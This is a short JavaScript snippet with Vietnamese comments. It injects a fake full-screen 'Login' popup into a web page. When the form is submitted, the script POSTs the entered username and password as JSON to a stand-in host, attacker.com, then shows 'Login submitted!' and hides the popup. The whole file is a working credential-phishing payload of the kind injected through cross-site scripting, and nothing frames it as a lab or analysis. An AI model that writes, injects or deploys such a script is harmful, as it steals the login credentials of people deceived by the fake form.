(function() {
    // Tạo phần tử overlay để làm nền cho popup
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = 0;
    overlay.style.left = 0;
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.zIndex = 9999;

    // Tạo phần tử chứa form
    const formContainer = document.createElement('div');
    formContainer.style.backgroundColor = '#fff';
    formContainer.style.padding = '20px';
    formContainer.style.borderRadius = '8px';
    formContainer.style.boxShadow = '0 2px 10px rgba(0,0,0,0.1)';
    formContainer.style.minWidth = '300px';

    // Tạo tiêu đề
    const title = document.createElement('h2');
    title.innerText = 'Login';
    title.style.marginBottom = '15px';
    formContainer.appendChild(title);

    // Tạo form
    const form = document.createElement('form');

    // Input username
    const usernameLabel = document.createElement('label');
    usernameLabel.innerText = 'Username: ';
    usernameLabel.htmlFor = 'usernameInput';
    const usernameInput = document.createElement('input');
    usernameInput.type = 'text';
    usernameInput.id = 'usernameInput';
    usernameInput.name = 'username';
    usernameInput.required = true;
    usernameInput.style.width = '100%';
    usernameInput.style.marginBottom = '10px';

    // Input password
    const passwordLabel = document.createElement('label');
    passwordLabel.innerText = 'Password: ';
    passwordLabel.htmlFor = 'passwordInput';
    const passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.id = 'passwordInput';
    passwordInput.name = 'password';
    passwordInput.required = true;
    passwordInput.style.width = '100%';
    passwordInput.style.marginBottom = '15px';

    // Nút submit
    const submitBtn = document.createElement('button');
    submitBtn.type = 'submit';
    submitBtn.innerText = 'Login';
    submitBtn.style.width = '100%';
    submitBtn.style.padding = '10px';

    // Append inputs vào form
    form.appendChild(usernameLabel);
    form.appendChild(usernameInput);
    form.appendChild(document.createElement('br'));
    form.appendChild(passwordLabel);
    form.appendChild(passwordInput);
    form.appendChild(document.createElement('br'));
    form.appendChild(submitBtn);

    // Xử lý sự kiện gửi form
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const user = usernameInput.value;
        const pass = passwordInput.value;

        // Gửi request đến attacker.com
        fetch('http://attacker.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ user: user, password: pass })
        }).then(response => {
            // Có thể xử lý phản hồi nếu cần
            alert('Login submitted!');
            // Ẩn popup sau khi gửi
            document.body.removeChild(overlay);
        }).catch(error => {
            console.error('Error:', error);
        });
    });

    // Thêm form vào container
    formContainer.appendChild(form);
    // Thêm container vào overlay
    overlay.appendChild(formContainer);
    // Thêm overlay vào body
    document.body.appendChild(overlay);
})();
